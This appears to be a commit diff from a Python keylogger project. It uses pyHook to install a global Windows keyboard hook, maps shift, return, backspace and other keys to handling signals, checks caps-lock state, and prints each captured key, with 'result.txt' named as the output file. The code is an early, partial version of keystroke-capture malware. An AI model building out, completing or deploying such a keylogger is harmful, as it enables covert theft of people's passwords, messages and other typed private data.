@@ -1,21 +1,39 @@
-import pythoncom, pyHook
+import pythoncom, pyHook # for hooking.
+import win32api, win32con # for indicate caps state.
+
+SIG_SHIFT = 0
+SIG_NEXTLINE = 1
+SIG_ERASE = 2
 
 FILE_NAME = "result.txt"
 
-def CombinationKeys(key):
-    if key in ["Lshift", "Rshift"]:
-        return True
-    if key in ["Space", "Return", "Back", "Tab"]:
-        return "\n"
+
+"""
+enter : Return
+backsapace : Back
+tab : Tab
+caps : Capital
+space : Space
+esc : Escape
+"""
+
+comb_keys = {
+    "Lshift" : SIG_SHIFT,
+    "Rshift" : SIG_SHIFT,
+    "Tab" : SIG_NEXTLINE,
+    "Return" : SIG_NEXTLINE,
+    "Space" : SIG_NEXTLINE,
+    "Escape" : SIG_NEXTLINE,
+    "Back" : SIG_ERASE,
+}
+
 
 def OnKeyboardEvent(event):
-    # functional keys to filter. Available to add other key.
-    func_keys = ["Space", "Return", "Back", "Tab", "Lshift", "Lcontrol", "Lmenu"]
+    # indicates state of caps lock. 0:lower / 1:upper
+    caps_stat = win32api.GetKeyState(win32con.VK_CAPITAL)
     try:
         key = str(event.Key)
-        if key in func_keys:
-            # restart point
-
+        print("Key: ", key)
     except:
         pass
 
